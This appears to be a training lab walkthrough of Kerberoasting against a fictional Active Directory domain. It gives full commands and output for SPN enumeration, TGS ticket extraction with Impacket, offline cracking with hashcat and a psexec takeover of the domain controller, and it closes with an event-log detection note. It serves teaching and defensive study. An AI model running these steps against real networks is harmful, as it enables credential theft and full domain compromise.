# Lab 02: Kerberoasting — SPN Enumeration, TGS Extraction & Hash Cracking

> **Lab Focus**: Comprehensive practical walkthrough of Kerberoasting: enumerating registered Service Principal Names (SPNs) via LDAP, requesting encrypted Ticket-Granting Service (TGS) tickets, forcing RC4 encryption downgrade, and cracking service account hashes offline.

---

## 1. Laboratory Environment Setup

```
+-----------------------------------------------------------------------------------------+
| ACTIVE DIRECTORY DOMAIN TOPOLOGY                                                        |
|                                                                                         |
|  [ATTACK BOX]               [DOMAIN CONTROLLER]           [ENTERPRISE DATABASE SERVER]  |
|  Kali Linux 2024.x          Windows Server 2022           Windows Server 2022           |
|  IP: 10.0.0.150             DC01.corp.local               SQL01.corp.local              |
|  Account: jdoe              IP: 10.0.0.1                  IP: 10.0.0.22                 |
|  Pass: Welcome2024!         Roles: AD DS, KDC             Target SPN: MSSQL/sql01.corp  |
|                                                           Runs as: CORP\svc_mssql       |
+-----------------------------------------------------------------------------------------+
```

* **Domain Realm**: `CORP.LOCAL`
* **Compromised Identity**: Standard domain user `jdoe` (zero administrative rights).
* **Target Account**: `svc_mssql` (Member of `Domain Admins`).

---

## 2. Phase 1: SPN Discovery & Reconnaissance

### Step 1: Query Active Directory for SPNs via LDAP
We query the Domain Controller using `ldapsearch` to find all user accounts with registered SPNs:

```bash
ldapsearch -x -H ldap://10.0.0.1 -D "jdoe@corp.local" -w "Welcome2024!" \
  -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName memberOf
```

#### Terminal Execution:
```text
# filter: (&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))
# requesting: sAMAccountName servicePrincipalName memberOf

dn: CN=svc_mssql,CN=Users,DC=corp,DC=local
sAMAccountName: svc_mssql
servicePrincipalName: MSSQLSvc/sql01.corp.local:1433
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local

# search result
# numResponses: 2
# numEntries: 1
```

* **High-Value Discovery**: `svc_mssql` is a direct member of **Domain Admins**! Cracking this single account yields complete domain compromise.

---

## 3. Phase 2: Requesting TGS Tickets with Impacket

Using `impacket-GetUserSPNs`, request the Kerberos ticket for `svc_mssql`. The tool automatically crafts a `TGS-REQ` asking for `etype 23` (`rc4-hmac`):

```bash
impacket-GetUserSPNs 'corp.local/jdoe:Welcome2024!' \
  -dc-ip 10.0.0.1 \
  -request-user svc_mssql \
  -outputfile svc_mssql_tgs.hash
```

#### Terminal Execution:
```text
Impacket v0.11.0 - Copyright 2023 Fortra

[*] ServicePrincipalName         Name       PwdLastSet             LastLogon
------------------------------  ---------  ---------------------  -------------------
MSSQLSvc/sql01.corp.local:1433  svc_mssql  2023-04-12 11:24:19    2026-11-20 09:15:32

[*] Requesting TGS for SPN: MSSQLSvc/sql01.corp.local:1433
[+] Hash written to svc_mssql_tgs.hash
```

### Inspecting the Extracted Hash Structure:
```bash
cat svc_mssql_tgs.hash
```
```text
$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$A1B2C3D4E5...$10F8E7D6C5...
```
* **Hash Breakdown**:
  - `$krb5tgs$23$`: Identifies Kerberos 5 TGS ticket using encryption type 23 (RC4-HMAC).
  - `*svc_mssql$CORP.LOCAL`: Target account and domain realm.
  - `*MSSQLSvc/sql01.corp.local:1433*`: Target SPN.
  - `$A1B2...`: 16-byte HMAC-MD5 checksum.
  - `$10F8...`: Encrypted service ticket payload (encrypted using the NT hash of `svc_mssql`).

---

## 4. Phase 3: High-Speed Offline Cracking with Hashcat

Feed the extracted ticket into Hashcat using mode **`13100`**:

```bash
hashcat -m 13100 -a 0 svc_mssql_tgs.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule -w 3 -O --status
```

#### Terminal Execution:
```text
hashcat (v6.2.6) starting...

CUDA API (CUDA 12.2)
* Device #1: NVIDIA GeForce RTX 4090, 24151/24564 MB, 128MCU

Hashes: 1 digests; 1 unique digests
Bitmask: 32 bytes

$krb5tgs$23$*svc_mssql$CORP.LOCAL...:DatabaseAdmin2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_mssql...
Time.Started.....: Fri Nov 21 02:18:22 2026 (4 secs)
Speed.#1.........: 8,421.2 MH/s
Recovered........: 1/1 (100.00%) Digests
```

* **Plaintext Password**: `DatabaseAdmin2024!`

---

## 5. Phase 4: Administrative Takeover via Pass-the-Hash / Pass-the-Password

With the recovered plaintext password, authenticate as `svc_mssql` and verify Domain Administrator access:

```bash
impacket-psexec 'corp.local/svc_mssql:DatabaseAdmin2024!@10.0.0.1'
```

```text
[*] Requesting shares on 10.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file kUjQ.exe
[*] Opening SVCManager on 10.0.0.1.....
[*] Creating service vLkM on 10.0.0.1.....
[*] Starting service vLkM on 10.0.0.1.....
[!] Press help for extra shell commands
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> net group "Domain Admins" /domain
Group name     Domain Admins
Comment        Designated administrators of the domain

Members
--------------------------------------------------
Administrator            svc_mssql
The command completed successfully.
```

---

## 6. Phase 5: Troubleshooting Operator Issues

```
+------------------------------------+------------------------------------+---------------------------------------+
| Observed Problem                   | Root Cause                         | Solution / Workaround                 |
+------------------------------------+------------------------------------+---------------------------------------+
| GetUserSPNs returns:               | The target account is configured   | The service account does not have an  |
| "No entries found!"                | with a SPN on a computer account   | SPN assigned to a USER account.       |
|                                    | rather than a user account.        | Check if any user accounts have SPNs. |
+------------------------------------+------------------------------------+---------------------------------------+
| Ticket is returned, but Hashcat    | The KDC issued an AES-256 ticket   | Crack with Hashcat mode 19700         |
| mode 13100 fails to parse it       | ($krb5tgs$18$) instead of RC4      | (AES-256) or mode 19600 (AES-128).    |
| (Token length exception).          | because RC4 is disabled on account.| Note: Cracking speed will be slower.  |
+------------------------------------+------------------------------------+---------------------------------------+
```

---

## 7. Phase 6: Defensive Verification & Event Log Inspection

Inspect Windows Event Viewer on Domain Controller `DC01`:
* **Event ID 4769**: A Kerberos service ticket was requested.
  - **Service Name**: `svc_mssql`
  - **Account Information**: `jdoe@CORP.LOCAL`
  - **Ticket Options**: `0x40810000`
  - **Ticket Encryption Type**: `0x17` (`rc4-hmac`)
